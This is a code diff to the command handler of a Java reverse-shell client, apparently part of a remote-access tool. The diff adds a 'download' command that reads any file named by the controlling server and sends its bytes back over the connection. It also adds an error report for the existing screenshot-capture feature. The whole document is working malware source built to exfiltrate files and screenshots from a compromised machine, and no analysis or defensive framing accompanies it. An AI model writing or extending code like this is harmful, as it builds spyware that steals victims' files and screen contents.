@@ -1,6 +1,7 @@
 package obs1d1anc1ph3r.reverseshell;
 
 import java.io.*;
+import java.nio.file.Files;
 import java.util.concurrent.TimeUnit;
 
 public class CommandHandler {
@@ -30,6 +31,17 @@ public class CommandHandler {
                 byte[] imageBytes = screenShot.imageBytes();
                 if (imageBytes != null && imageBytes.length > 0) {
                     serverConnection.sendScreenShot(imageBytes);
+                } else {
+                    serverConnection.sendResponse("Error: Failed to capture screenshot.");
+                }
+                continue;
+            } else if (command.startsWith("download")) {
+                String[] parts = command.split(" ", 2);
+                if (parts.length >= 2) {
+                    String filePath = parts[1].trim();
+                    handleDownload(filePath);
+                } else {
+                    serverConnection.sendResponse("Error: Invalid download command syntax.");
                 }
                 continue;
             } else {
@@ -38,6 +50,35 @@ public class CommandHandler {
             if (fullResponse.length() > 0) {
                 serverConnection.sendResponse(fullResponse.toString().trim());
             }
+        }
+    }
+
+    private void handleDownload(String filePath) {
+        File file = new File(filePath);
+        if (!file.isAbsolute()) {
+            file = new File(currentDir, filePath);
+        }
+
+        try {
+            file = file.getCanonicalFile();
+            if (!file.exists()) {
+                serverConnection.sendResponse("Error: File not found at " + file.getAbsolutePath());
+                return;
+            }
+            if (!file.isFile()) {
+                serverConnection.sendResponse("Error: Path is not a file: " + file.getAbsolutePath());
+                return;
+            }
+            if (!file.canRead()) {
+                serverConnection.sendResponse("Error: File is not readable: " + file.getAbsolutePath());
+                return;
+            }
+
+            byte[] fileBytes = Files.readAllBytes(file.toPath());
+            serverConnection.sendResponse("file download");
+            serverConnection.sendFile(fileBytes);
+        } catch (IOException ex) {
+            serverConnection.sendResponse("Error: Unable to process file at " + file.getAbsolutePath() + " - " + ex.getMessage());
         }
     }
 
